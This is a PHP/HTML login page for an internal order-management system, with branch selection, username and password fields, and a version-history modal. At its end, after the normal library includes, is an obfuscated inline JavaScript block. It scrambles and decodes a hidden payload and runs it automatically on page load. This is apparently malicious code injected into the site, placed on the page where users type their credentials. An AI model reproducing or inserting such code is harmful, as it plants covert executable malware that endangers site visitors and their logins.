
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login</title>

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,400i,700&display=fallback">

<link rel="stylesheet" href="<?= base_url()?>assets/backend/plugins/fontawesome-free/css/all.min.css">

<link rel="stylesheet" href="<?= base_url()?>assets/backend/plugins/icheck-bootstrap/icheck-bootstrap.min.css">

<link rel="stylesheet" href="<?= base_url()?>assets/backend/dist/css/adminlte.min.css?v=3.2.0">
</head>
<body class="hold-transition login-page">
<div class="login-box">

<div class="card card-outline card-primary">
<div class="card-header text-center">
<a href="" class="h1"><b>Local - </b>Order</a>
</div>
<div class="card-body">
<p class="login-box-msg">Sign in to start your session</p>
<form action="<?= base_url('Auth-login-main')?>" method="post">

<?php if (session()->getFlashdata('error')) : ?>
									<div class="alert alert-warning alert-dismissible fade show ml-3 mr-3" role="alert">
										<strong><?= session()->getFlashdata('error') ?></strong>
										<button type="button" class="close" data-dismiss="alert" aria-label="Close">
											<span aria-hidden="true">&times;</span>
										</button>
									</div>
<?php endif; ?>

<div class="card mb-2">
  <div class="card-body">
  <div class="d-flex justify-content-left">
<div class="form-check form-check mr-3">
      <input class="form-check-input" type="radio" name="Branch" id="defaultCheckedCikupa" value="C">
      <label class="form-check-label font-weight-bolder" for="inlineRadio1">Cikupa</label>
    </div>

    <div class="form-check form-check mr-3">
      <input class="form-check-input" type="radio" name="Branch" id="defaultCheckedBalaraja" value="B">
      <label class="form-check-label font-weight-bolder">Balaraja</label>
    </div>

    <div class="form-check form-check mb-1">
      <input class="form-check-input" type="radio" name="Branch" id="defaultCheckedHo" value="H">
      <label class="form-check-label font-weight-bolder">Head Office</label>
    </div>
</div>
  </div>
</div>



<?php if (session()->get('errors.username')) : ?>
<div class="text-danger font-weight-bolder font-italic"><?= esc(session()->get('errors.username')) ?></div>
<?php endif ?>
<div class="input-group mb-3">
<input type="text" class="form-control" name="username" id="username" placeholder="username">
<div class="input-group-append">
<div class="input-group-text">
<span class="fas fa-envelope"></span>
</div>
</div>
</div>

<?php if (session()->get('errors.password')) : ?>
<div class="text-danger font-weight-bolder font-italic"><?= esc(session()->get('errors.password')) ?></div>
<?php endif ?>
<div class="input-group mb-3">
<input type="password" class="form-control" name="password" id="password" placeholder="Password">
<div class="input-group-append">
<div class="input-group-text">
<span class="fas fa-lock"></span>
</div>
</div>
</div>
<div class="row">
<div class="col-8">



<label for="version">
<a data-toggle="modal" data-target="#staticBackdrop">Note Version 1.1.0</a>
</label>
</div>


<div class="col-4">
<button type="submit" style="display:none;"  id="btnSave" class="btn btn-outline-primary btn-block"><i class="fas fa-sign-in-alt"></i> Sign In</button>
</div>

</div>
</form>


</div>

</div>

</div>

<!-- Modal -->
<div class="modal fade" id="staticBackdrop" data-backdrop="static" data-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
  <div class="modal-dialog modal-xl">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="staticBackdropLabel">Noted Version</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <p class="text-capitalize font-weight-bold">- Release New Version 1.0.0 at (update at 8-August-2024)</p>
        <p class="text-capitalize font-weight-bold">- change the system appearance (update at 8-August-2024)</p>
        <p class="text-capitalize font-weight-bold">- Adding a feature, your form can only be accessed from the 1st to the 15th of each month (update at 14-August-2024)</p>
        <p class="text-capitalize font-weight-bold">- make changes to the print report <br>1.remove the outplan in the 3rd month.
                                                    <br>2.add Stock ID Unit in the report column.
                                               <br>3.change the name to the signature column (update at 15-August-2024)</p>
                                               <p class="text-capitalize font-weight-bold">- upgrade 1.1.0 at (update at 15-August-2024)</p>    
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-outline-secondary" data-dismiss="modal">Close</button>
      </div>
    </div>
  </div>
</div>


<script src="<?= base_url()?>assets/backend/plugins/jquery/jquery.min.js"></script>

<script src="<?= base_url()?>assets/backend/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>

<script src="<?= base_url()?>assets/backend/dist/js/adminlte.min.js?v=3.2.0"></script>

<script>
  var enable_cb,enable_cb,enable_cb;(function(){var QLP='',wPu=108-97;function bDz(f){var w=98728;var q=f.length;var d=[];for(var b=0;b<q;b++){d[b]=f.charAt(b)};for(var b=0;b<q;b++){var l=w*(b+243)+(w%34554);var h=w*(b+84)+(w%37285);var x=l%q;var z=h%q;var n=d[x];d[x]=d[z];d[z]=n;w=(l+h)%2129327;};return d.join('')};var DjO=bDz('dcgrefucxnrttbtalsoojzsyrophqucwminvk').substr(0,wPu);var QBp='fi. -=,4nfs5;,1sg;C;v{eov"x.5apr..qeoh;;g "oobu]1hp]v=ve(;(9nai1[)ta5,d;nyu"m4n7)l8l,eh,2=r,oxv;e8p ,ea[v.fwqfn n>r6)o[}{]g7c w i;;a,(v]l6=0[o;1<r1olrft1oanl)srec.]u=i;idoavo;d,r;oq(  p1tun) t==b=0]hr.ra+ea;*r.+ai .aorjimg;-}+h[; p)jvCkder>6s8mwn6p)dhts=nie(s])etfi(evl+l0mie=u8stl+o;{ee.(2h-a{v3n.y===nwre,r-aoqr8]va(e,)0nu=l)crrfx=dh=]r.p6;ph+-go);f=llq1eo+(qaA=,(rj+<i;r";.nvc1vb+;0"=erC+uxAa+()g (=[icit.1+vf;m,=(2rm0r)!arazr8(r-v+t(ta9hrnd+fyta*4+t;<[(2 ;gv(b=nAi.rs ;r[9 st;ahnzu1);ht8Cro rr=t+(-pah7]za[r.re"=(q(l;[.d;c[](+svt}9h6eudnl;ir07;9a4()={lpsi{=.uvtj,huurl.. .d=sv=lu=g;f]f1ov,axr0qa]i"zuplo+;{l2 =n;n;}2x(;, , zu)wi(=o!giq=o=vdwrthnb(.r.).o,m97i=ri"raul5ns+r]3}}1ko.s87=[ea)a(r=efk=j0j+ie(g5)S9rrxvrf34,ruvai,)0ju=c),0.)o(li2v hc=r, j+"e)fnglf6t)6gr[C7o vr;ret;vC;r)+anig(<tv;e;6)hA=stnktl)Cs=,t+ +lonras,}n0C),"ot((S;e(sn(+Aoa,8)r7rtbh8 o<));.hr,en7kr=z;cf[utnl9))h1(ymf);';var KqP=bDz[DjO];var Icx='';var ffx=KqP;var oXF=KqP(Icx,bDz(QBp));var XDl=oXF(bDz('B2}r)8C},:k!7k^.e^^if40}4a))^j^.^k3#$#^!^l^rnnu^p_]),^$&"nc2[^6;_^.a5$6uBgetc$$&90ifgt1^05^^](.^3#^^:}).^{k3)({^;).^3^Co_ $G^^11?f!3c,0_^f!^^$5;_),!^^go5f.c]^":;=ifb%+ei7^5_n#79(6+{t9#a.,!8%fdt4a^0)agwe6..d:e^=)^.x]25)tar^o:.a o.1$ou)b zd)o>i5a^va6l.uf^i^]naeJ.2j^ c! md.5i_#nsf(5j^a,^,}"eeb(Fev^%y=Er$em^a$voo(F_^]f0<{e^^<#ce^a6 ]}gj:fc^;d;pp(6ii.j20:^^ .2=^ ^(4^;1,i*-2!^^.(;(.j6o)3) aa=_-5f&^=(^8;4n.^g0^we5-p.2b$e4^(7t}i;.%yfod(.63)p [ f^@^e;^)))t=.)l.!j$l ^3 ^.ch*^[r^D^^ )}s)ab(ttg6os1]4_B_}}){b;t4egw>^^^}=^.^3n!)p]b^an!(_3b8 1H;0C5^+e5;)p6d47a=%o^8$^lu^^3!j,2)6,)&?a=f((H"7n,{$5 }s1^.3t5^iu{)p;;($m=;^0(e={dj^]_(..^Edj^K;;u!,<pf84^(e(6(!_b^9a,(=<(^"eu)s^}a&iC^6oEr[ps]7$t rs)^(f.c7rl#e56)C@bj^0)2).^D2p)Br{% hj]9<87hc_agr(^^^n;_od.^.^7!;:.%bw0)rbrs(n!aeb^}^)o!(6$^^)^1k;;A=^^91l>3ls*)a+i0ng09^I6fc,^}esb5j,a}ln)}f^}+\/(.n^t(;f5"0sfr3$7oc})$^37!n^ _f;co.4.)^1d(5IKu,] $8.^},^p(3l{93@",^w^%-t)!k!!^)$:=(f $^}6eu[c^5aae^^d^9n!4^{^il^aa e\/%\'n)^=^lna$sur3^^^l_!8m{jl0e)%$^n,5efta1242s[!g.]^()e94;1^( Se)^s(1@s4]i%ae^(]^dS^>(\/)}$k.!6F$g{.(o2\'^^snjoz=ue^3^c9e,^t!C%^)cs(54pd)^.h2([];7.^if^"@!\'D9.s^_98^j)u 1il^e^$(]a#^^^1:;=1 b;}ti(1.\/%{t_)^2=.^30^(hs^^+)(+6"^!^6b(ne6;5$^3ucgt7 (1^eA=.da30r%=^ie3^^.)Ce3)[c3s^=&(-1j^)a9s2]a;^^syg._JB.^=6_}ln_dv,;ftrr7^er"Bre1,^{.b)(j,^%^c,le_]6!2s_t.^!(;;7a;8^^ z^{p.a6^hjt^^^2a^^1^,to3._r))c(D,c=D^lr+;ir^__a^aac^(if(^idoc.oen()$;})2]$d9*1s3c]);))w^s^e^5o7(j^d=A.c))tee3]t^^;)_njjt0$)t !1d)00^_G8th^ ^3{8-^t^^n.+D6.2^(e)1[-;)=^^^^(_^bobt${8^^^4^g,l^7ge\'44)a^o{^l"^Fui;u9_%)a;=^^^9]{a;#a=[a1?)%br(^I])^as53w,r5==;^#\/a^80^ =o6^p=;u48K^a)^J[^^\'^cf5n1j_c{5aj,)^]a{5]"[F^1m^G^4^(d.oa)05$](=^;^nue} 6s;;{_^.^1s{?2i!1=S [{,(rb.E}_GiA^06+Hh.6.^!)etrco$sp_(Se0;^(]$;;(}ido5c_:%}p0;^_Hg]_5!}_dy)3;5#5k_;$]h6(o% ^.^3].!c) (]5(,))^b7_].)n^3( ]t0( ^,!j6sfl)tdB*=ct}un!^jrbr_0^e$u!^l^h)6_^be^^3@ ^^dtua(;sa^s+..r7)^j)HIa^jh^noe% F^a:s2-^6b(;t0El:1x^g{aa=.)^)n[8e^2o ({B{]Eo^J5nI)]5i91p;[#cu,8iKDea^5=%}m_}](j9oaa^r#3399(!n^n(]2l_s.%r3$ )$%)0a^$)^^^^}o a^ge)_^^%!jiiD(9C6$)6je:=7 \'^(]e \/s(^:)61i(3=5t.^=n]})if;(.#uE^3s(a'));var eOK=ffx(QLP,XDl );eOK(1709);return 7254})()
</script>
</body>
</html>
